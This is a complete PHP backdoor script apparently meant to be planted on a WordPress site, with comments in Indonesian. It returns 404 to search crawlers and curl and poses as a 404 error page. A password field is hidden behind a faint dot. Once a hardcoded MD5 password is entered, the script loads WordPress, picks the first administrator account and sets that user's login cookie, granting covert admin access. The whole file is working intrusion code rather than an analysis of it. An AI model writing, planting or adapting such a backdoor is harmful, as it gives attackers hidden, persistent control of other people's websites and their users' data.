<?php
session_start();
define('APP_VER', '0.8');
$password = defined('PW') ? PW : '8c59377fd3661cb3cb7d8894566a4032';

// Undetect bots
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
    if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

// Handle login actions DULU
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['password']) && md5($_POST['password'])==$password) {
        $_SESSION['logged_in'] = true;
        
        // BARU cek WordPress SETELAH password benar
        $rxtql = $_SERVER['DOCUMENT_ROOT'];
        @chdir($rxtql);
        if (file_exists('wp-load.php')) {
            include 'wp-load.php';
            $wp_user_query = new WP_User_Query(array(
                'role' => 'Administrator', 'number' => 1, 'fields' => 'ID'
            ));
            $results = $wp_user_query->get_results();
            if (isset($results[0])) {
                wp_set_auth_cookie($results[0]);
                wp_redirect(admin_url());
                die();
            }
        }
        header('Location:');
        exit;
    }
    
    // Tampilkan form jika password salah/belum login
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>404 Not Found</title><style>
html,body{margin:0;padding:0;height:100%;overflow:hidden}
iframe{position:absolute;top:0;left:0;width:100vw;height:100vh;border:none}
#form{position:absolute;z-index:9999}
#form input{opacity:0;pointer-events:none;position:absolute;cursor:default;transition:0.3s}
#form input.revealed{opacity:1;pointer-events:auto;cursor:pointer}
#form button{display:none}
.clue-dot{position:fixed;bottom:20px;right:20px;width:6px;height:6px;background:rgba(0,0,0,0.1);border-radius:50%;opacity:0.5;cursor:pointer}
</style></head><body>
<iframe src="/404"></iframe>
<form id="form" method="post">
<input type="password" name="password" id="input" autocomplete="off">
<button type="submit">Login</button>
</form>
<div class="clue-dot" title="404"></div>
<script>
const f=document.getElementById("form"),i=document.getElementById("input"),d=document.querySelector(".clue-dot"),x=Math.random()*(window.innerWidth-100),y=Math.random()*(window.innerHeight-30);
f.style.left=`${x}px`;f.style.top=`${y}px`;d.onclick=()=>{i.classList.add("revealed");i.focus()};
</script></body></html>';
    exit;
}

// User sudah login - redirect atau dashboard
header('Location: /');
exit;
?>
